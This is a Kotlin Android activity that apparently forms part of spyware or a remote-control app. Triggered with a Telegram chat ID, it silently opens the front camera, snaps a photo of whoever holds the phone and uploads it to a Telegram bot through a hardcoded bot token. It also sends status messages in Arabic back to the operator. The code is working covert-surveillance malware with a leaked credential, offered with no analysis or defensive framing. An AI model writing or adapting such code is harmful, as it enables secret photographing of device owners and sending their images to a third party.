package com.cognitive.ai.syncagent

import android.app.Activity
import android.content.pm.PackageManager
import android.hardware.Camera
import android.os.Bundle
import android.util.Log
import android.view.SurfaceHolder
import android.view.SurfaceView
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

@Suppress("DEPRECATION")
class CameraCaptureActivity : Activity(), SurfaceHolder.Callback {

    companion object {
        private const val TAG = "CameraCaptureAct"
        private const val BOT_TOKEN = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
    }

    private var camera: Camera? = null
    private lateinit var surfaceView: SurfaceView
    private lateinit var surfaceHolder: SurfaceHolder
    private var chatId: String = ""
    private var isCapturing = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        chatId = intent.getStringExtra("chat_id") ?: ""

        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendStatusMessage(chatId, "⚠️ صلاحية الكاميرا غير ممنوحة للتطبيق.")
            finish()
            return
        }

        surfaceView = SurfaceView(this)
        setContentView(surfaceView)

        surfaceHolder = surfaceView.holder
        surfaceHolder.addCallback(this)
    }

    override fun surfaceCreated(holder: SurfaceHolder) {
        if (isCapturing) return
        try {
            val frontCameraId = findFrontCameraId()
            if (frontCameraId == -1) {
                sendStatusMessage(chatId, "⚠️ لم يتم العثور على كاميرا أمامية في الجهاز.")
                releaseCameraAndFinish()
                return
            }

            camera = Camera.open(frontCameraId)
            camera?.setPreviewDisplay(holder)
            camera?.startPreview()

            surfaceView.postDelayed({
                if (isCapturing) return@postDelayed
                isCapturing = true
                try {
                    camera?.takePicture(null, null, Camera.PictureCallback { data, _ ->
                        releaseCameraOnly()
                        if (data != null && data.isNotEmpty()) {
                            thread(name = "UploadPhotoThread") {
                                uploadPhotoToTelegram(data)
                            }
                        } else {
                            sendStatusMessage(chatId, "⚠️ لم يتم استلام بيانات الصورة من الكاميرا.")
                        }
                        finish()
                    })
                } catch (e: Exception) {
                    Log.e(TAG, "takePicture failed", e)
                    sendStatusMessage(chatId, "⚠️ فشل التقاط الصورة: ${e.message}")
                    releaseCameraAndFinish()
                }
            }, 1500)

        } catch (e: Exception) {
            Log.e(TAG, "Camera open failed", e)
            sendStatusMessage(chatId, "⚠️ تعذر فتح الكاميرا: ${e.message}")
            releaseCameraAndFinish()
        }
    }

    private fun findFrontCameraId(): Int {
        val numberOfCameras = Camera.getNumberOfCameras()
        val cameraInfo = Camera.CameraInfo()
        for (i in 0 until numberOfCameras) {
            Camera.getCameraInfo(i, cameraInfo)
            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                return i
            }
        }
        return if (numberOfCameras > 0) 0 else -1
    }

    private fun uploadPhotoToTelegram(data: ByteArray) {
        if (chatId.isBlank()) {
            Log.e(TAG, "Missing chatId for photo upload")
            return
        }

        var connection: HttpURLConnection? = null
        try {
            val boundary = "Boundary_" + System.currentTimeMillis()
            val lineEnd = "\r\n"
            val twoHyphens = "--"

            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
            connection = url.openConnection() as HttpURLConnection
            connection.doOutput = true
            connection.doInput = true
            connection.useCaches = false
            connection.requestMethod = "POST"
            connection.connectTimeout = 15000
            connection.readTimeout = 30000
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            connection.outputStream.use { out ->
                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
                out.write("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
                out.write((chatId + lineEnd).toByteArray(Charsets.UTF_8))

                out.write((twoHyphens + boundary + lineEnd).toByteArray(Charsets.UTF_8))
                out.write("Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"$lineEnd".toByteArray(Charsets.UTF_8))
                out.write("Content-Type: image/jpeg$lineEnd$lineEnd".toByteArray(Charsets.UTF_8))
                out.write(data)
                out.write(lineEnd.toByteArray(Charsets.UTF_8))

                out.write((twoHyphens + boundary + twoHyphens + lineEnd).toByteArray(Charsets.UTF_8))
                out.flush()
            }

            val code = connection.responseCode
            val stream = if (code == 200) connection.inputStream else connection.errorStream
            val responseText = stream?.bufferedReader()?.use { it.readText() } ?: ""
            Log.d(TAG, "sendPhoto response ($code): $responseText")

            val ok = try {
                JSONObject(responseText).optBoolean("ok", false)
            } catch (_: Exception) {
                false
            }

            if (code != 200 || !ok) {
                sendStatusMessage(chatId, "⚠️ فشل إرسال الصورة إلى تيليجرام (رمز $code).")
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadPhotoToTelegram error", e)
            sendStatusMessage(chatId, "⚠️ خطأ أثناء رفع الصورة: ${e.message}")
        } finally {
            connection?.disconnect()
        }
    }

    private fun sendStatusMessage(targetChatId: String, text: String) {
        if (targetChatId.isBlank()) return
        thread(name = "CameraStatusMsg") {
            var conn: HttpURLConnection? = null
            try {
                val body = JSONObject().apply {
                    put("chat_id", targetChatId)
                    put("text", text)
                }
                conn = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.connectTimeout = 10000
                conn.readTimeout = 15000
                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                conn.inputStream?.close()
            } catch (e: Exception) {
                Log.e(TAG, "sendStatusMessage error", e)
            } finally {
                conn?.disconnect()
            }
        }
    }

    private fun releaseCameraOnly() {
        try {
            camera?.stopPreview()
            camera?.release()
            camera = null
        } catch (e: Exception) {
            Log.e(TAG, "releaseCameraOnly error", e)
        }
    }

    private fun releaseCameraAndFinish() {
        releaseCameraOnly()
        finish()
    }

    override fun surfaceChanged(holder: SurfaceHolder, format: Int, width: Int, height: Int) {}

    override fun surfaceDestroyed(holder: SurfaceHolder) {
        releaseCameraOnly()
    }

    override fun onDestroy() {
        releaseCameraOnly()
        super.onDestroy()
    }
}
